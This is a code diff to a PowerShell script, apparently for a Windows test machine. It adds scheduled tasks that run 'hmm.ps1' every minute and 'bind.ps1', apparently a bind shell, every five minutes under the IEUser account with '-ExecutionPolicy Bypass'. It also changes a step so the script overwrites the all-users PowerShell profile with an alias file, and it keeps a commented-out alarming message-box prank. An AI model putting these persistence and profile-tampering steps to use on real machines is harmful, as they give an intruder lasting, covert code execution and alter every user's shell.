@@ -23,7 +23,9 @@ function CreateLocalUsers(){
 
 function TaskCreations(){
     #schtasks /create /tn whoami /tr "powershell -ExecutionPolicy Bypass -Command ""&" {[System.Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms'); [System.Windows.Forms.MessageBox]::Show('WHAT IS HAPPENING?!?!','AAAAAAAHHHHHHHH')}"" /sc minute /mo 1 /ru IEUser
-    schtasks /create /tn whoami /tr "powershell -ExecutionPolicy Bypass ./hmm.ps1" /sc minute /mo 1 /ru IEUser
+    $path = $(echo $PWD)
+    schtasks /create /tn whoami /tr "powershell -ExecutionPolicy Bypass $path\hmm.ps1" /sc minute /mo 1 /ru IEUser
+    schtasks /create /tn binded /tr "powershell -ExecutionPolicy Bypass $path\bind.ps1" /sc minute /mo 5 /ru IEUser
 }
 # powershell -ExecutionPolicy Bypass -Command "&" "{[System.Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms'); [System.Windows.Forms.MessageBox]::Show('WHAT IS HAPPENING?!?!','AAAAAAAHHHHHHHH')}"
 # function AnnoyingAlert(){
@@ -43,7 +45,7 @@ function SetMemeAliases()
 
     if (!(Test-Path -Path $PROFILE.AllUsersAllHosts)) {
         New-Item -ItemType File -Path $PROFILE.AllUsersAllHosts -Force
-        Get-Content C:\Aliases.txt >> $PROFILE.AllUsersAllHosts
+        Get-Content C:\Aliases.txt > $PROFILE.AllUsersAllHosts
       }
 
 }
